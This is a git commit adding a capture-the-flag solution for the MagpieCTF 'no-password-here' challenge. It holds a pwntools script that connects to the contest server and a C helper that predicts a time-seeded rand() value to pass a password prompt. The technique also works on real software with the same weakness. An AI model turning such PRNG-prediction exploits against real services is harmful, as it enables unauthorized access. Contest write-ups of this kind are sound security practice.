9644e2c6be7194b4bc1583b49ff56d23d858b431
Jordi <sroot079@gmail.com>
2023-02-26 21:53:11 -0500

    magpie ctf

---
+++ CTFs/magpie/no-password-here/exp.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+from pwn import *
+from subprocess import *
+context.log_level='debug'
+context.arch='amd64'
+#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+# p=process('./Code')
+p=remote("srv1.2023.magpiectf.ca",1996)
+ru 		= lambda a: 	p.readuntil(a)
+r 		= lambda n:		p.read(n)
+sla 	= lambda a,b: 	p.sendlineafter(a,b)
+sa 		= lambda a,b: 	p.sendafter(a,b)
+sl		= lambda a: 	p.sendline(a)
+s 		= lambda a: 	p.send(a)
+# gdb.attach(p)
+
+guess = check_output(["./seed"])
+sla("?",guess)
+
+
+p.interactive()
---
+++ CTFs/magpie/no-password-here/seed.c
@@ -0,0 +1,10 @@
+#include <stdio.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    srand(time(NULL));
+    printf("%d", rand());
+    return 0;
+}
